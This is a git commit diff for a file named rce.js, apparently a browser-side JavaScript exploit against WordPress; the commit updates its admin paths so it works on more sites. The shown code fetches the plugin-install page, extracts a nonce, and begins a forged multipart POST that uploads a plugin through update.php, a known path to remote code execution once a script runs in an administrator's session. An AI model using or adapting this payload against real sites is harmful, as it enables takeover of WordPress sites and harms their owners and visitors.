a9bf498815986e545b9b1ce95065eb81561aa79a
Sayan Chakraborty <91497027+xgt6op@users.noreply.github.com>
2023-04-25 10:58:55 +0530

    Update rce.js
    Now most of the site does not have /WordPress
     link

--- rce.js
+++ rce.js
@@ -1,5 +1,5 @@
 var ajax = new XMLHttpRequest();
-ajax.open("GET","/wordpress/wp-admin/plugin-install.php",true);
+ajax.open("GET","/wp-admin/plugin-install.php",true);
 ajax.onreadystatechange = function(){
   if(this.readyState == 4){
     if(this.status == 200){
@@ -8,7 +8,7 @@ ajax.onreadystatechange = function(){
       var nonce = result[1];
 
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", "/wordpress/wp-admin/update.php?action=upload-plugin", true);
+      xhr.open("POST", "/wp-admin/update.php?action=upload-plugin", true);
       xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
       xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
       xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------106557699112863554041057400679");
